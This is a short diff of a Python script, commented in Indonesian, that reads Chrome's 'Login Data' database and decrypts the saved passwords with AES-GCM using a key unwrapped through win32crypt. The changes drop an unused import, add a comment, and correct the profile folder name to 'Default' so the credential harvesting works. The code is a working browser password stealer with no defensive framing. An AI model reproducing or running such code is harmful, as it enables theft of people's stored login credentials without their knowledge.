@@ -5,7 +5,7 @@ import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 import shutil
-from datetime import timezone, datetime, timedelta
+from datetime import datetime, timedelta
 
 
 def dapatkan_waktu_chrome(chromedate):
@@ -41,6 +41,7 @@ def dekripsi_password(password, key):
     try:
         # mendapatkan vektor inisialisasi
         iv = password[3:15]
+        # substring mulai dari karakter ke-15 hingga akhir
         password = password[15:]
         # menghasilkan cipher
         cipher = AES.new(key, AES.MODE_GCM, iv)
@@ -65,7 +66,7 @@ def main():
         "Google",
         "Chrome",
         "User Data",
-        "default",
+        "Default",
         "Login Data",
     )
     # mengcopy file ke lokasi lain
